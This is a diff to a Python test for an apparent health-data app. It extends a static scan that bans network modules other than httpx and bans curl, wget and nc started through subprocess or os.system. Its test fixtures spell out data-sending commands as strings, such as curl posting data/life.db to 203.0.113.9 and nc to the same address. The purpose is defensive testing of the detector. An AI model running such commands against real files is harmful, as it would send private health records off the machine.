@@ -3,6 +3,15 @@
 Walks app/ and tools/ without importing them, so it passes on an empty tree and
 on any tree whose only outbound hosts are Goodreads and the Anthropic API.
 Health data stays home: any other host is a failing test.
+
+Also banned in app/ and tools/: the network modules that bypass httpx (`requests`,
+`urllib.request`, `socket`, `http.client`, `ftplib`, `smtplib`, `telnetlib`) and starting
+`curl`, `wget` or `nc` through `subprocess` or `os.system`.
+
+Limit: this is a static scan. A host assembled at runtime (joined from parts, read from a
+file or the environment, decoded) is not a literal and cannot be caught here; that case
+rests on review and on the adapters' own checks (the Pixoo adapter accepts LAN addresses
+only).
 """
 
 from __future__ import annotations
@@ -19,7 +28,19 @@ ALLOWED_HOSTS = frozenset({"www.goodreads.com", "goodreads.com", "api.anthropic.
 LOOPBACK_HOSTS = frozenset({"127.0.0.1", "localhost", "0.0.0.0"})
 LAN_PREFIX = "192.168."
 
-BANNED_IMPORTS = (("requests",), ("urllib", "request"))
+BANNED_IMPORTS = (
+    ("requests",),
+    ("urllib", "request"),
+    ("socket",),
+    ("http", "client"),
+    ("ftplib",),
+    ("smtplib",),
+    ("telnetlib",),
+)
+BANNED_PROGRAMS = frozenset({"curl", "wget", "nc"})
+PROCESS_CALLS = frozenset(
+    {"run", "Popen", "call", "check_call", "check_output", "system", "popen", "getoutput"}
+)
 
 NETWORK_MARKERS = (
     "httpx",
@@ -114,9 +135,27 @@ def _banned_import(node: ast.AST) -> str | None:
         for banned in BANNED_IMPORTS:
             if parts[: len(banned)] == banned:
                 return node.module
-        if parts == ("urllib",) and any(a.name == "request" for a in node.names):
-            return "urllib.request"
+        for alias in node.names:
+            if (*parts, alias.name) in BANNED_IMPORTS:
+                return f"{node.module}.{alias.name}"
     return None
+
+
+def _banned_program(call: ast.Call) -> str | None:
+    """`curl`, `wget` or `nc` as the program of a subprocess/os.system style call."""
+    name = _dotted_name(call.func)
+    if not name or name.split(".")[-1] not in PROCESS_CALLS:
+        return None
+    command = next((kw.value for kw in call.keywords if kw.arg == "args"), None)
+    if command is None and call.args:
+        command = call.args[0]
+    if isinstance(command, ast.List | ast.Tuple) and command.elts:
+        command = command.elts[0]
+    if not (isinstance(command, ast.Constant) and isinstance(command.value, str)):
+        return None
+    words = command.value.split()
+    program = words[0].rsplit("/", 1)[-1] if words else ""
+    return program if program in BANNED_PROGRAMS else None
 
 
 def _scan_source_regex(path: Path, text: str) -> list[Violation]:
@@ -151,6 +190,11 @@ def scan_file(path: Path) -> list[Violation]:
                 host = host_from_url(match.group(0))
                 if host and not host_allowed(host):
                     found.append(Violation(path, node.lineno, "url", host))
+
+        if isinstance(node, ast.Call):
+            program = _banned_program(node)
+            if program:
+                found.append(Violation(path, node.lineno, "subprocess", program))
 
         if isinstance(node, ast.Call) and _is_network_call(node):
             values = list(node.args) + [kw.value for kw in node.keywords]
@@ -233,3 +277,52 @@ def test_allowlisted_and_lan_hosts_pass(tmp_path: Path) -> None:
         encoding="utf-8",
     )
     assert scan_tree(tmp_path) == []
+
+
+def _scan_one(tmp_path: Path, folder: str, source: str) -> list[Violation]:
+    pkg = tmp_path / folder
+    pkg.mkdir(parents=True, exist_ok=True)
+    (pkg / "leak.py").write_text(source, encoding="utf-8")
+    return scan_tree(tmp_path)
+
+
+def test_gate_catches_network_modules_that_bypass_httpx(tmp_path: Path) -> None:
+    mutants = {
+        'import socket\n\nsocket.create_connection(("metrics.example.net", 443))\n': "socket",
+        "from socket import create_connection\n": "socket",
+        'import http.client\n\nhttp.client.HTTPSConnection("metrics.example.net")\n': (
+            "http.client"
+        ),
+        "from http import client\n": "http.client",
+        "from http.client import HTTPSConnection\n": "http.client",
+        "import ftplib\n": "ftplib",
+        "import smtplib\n": "smtplib",
+        "from telnetlib import Telnet\n": "telnetlib",
+    }
+    for index, (source, module) in enumerate(mutants.items()):
+        violations = _scan_one(tmp_path / str(index), "app/jobs", source)
+        imports = [v.detail for v in violations if v.kind == "import"]
+        assert imports == [f"{module} (use httpx)"], source
+
+
+def test_gate_catches_curl_wget_and_nc_started_as_subprocesses(tmp_path: Path) -> None:
+    mutants = {
+        'import subprocess\n\nsubprocess.run(["curl", "-T", "x", "ftp://backup.example.net/"])\n': (
+            "curl"
+        ),
+        'import subprocess\n\nsubprocess.Popen(["/usr/bin/wget", "-q", "-O-", "x"])\n': "wget",
+        'import subprocess\n\nsubprocess.check_output("nc 203.0.113.9 9000", shell=True)\n': "nc",
+        'import os\n\nos.system("curl -s -d @data/life.db 203.0.113.9")\n': "curl",
+    }
+    for index, (source, program) in enumerate(mutants.items()):
+        violations = _scan_one(tmp_path / str(index), "tools", source)
+        assert [v.detail for v in violations if v.kind == "subprocess"] == [program], source
+
+
+def test_starting_our_own_python_is_not_a_violation(tmp_path: Path) -> None:
+    source = (
+        "import subprocess\nimport sys\n\n"
+        'subprocess.Popen([sys.executable, "-m", "tools.drill", "--child", "nc"])\n'
+        'subprocess.run(["sqlite3", "data/life.db", "PRAGMA integrity_check"])\n'
+    )
+    assert _scan_one(tmp_path, "tools", source) == []
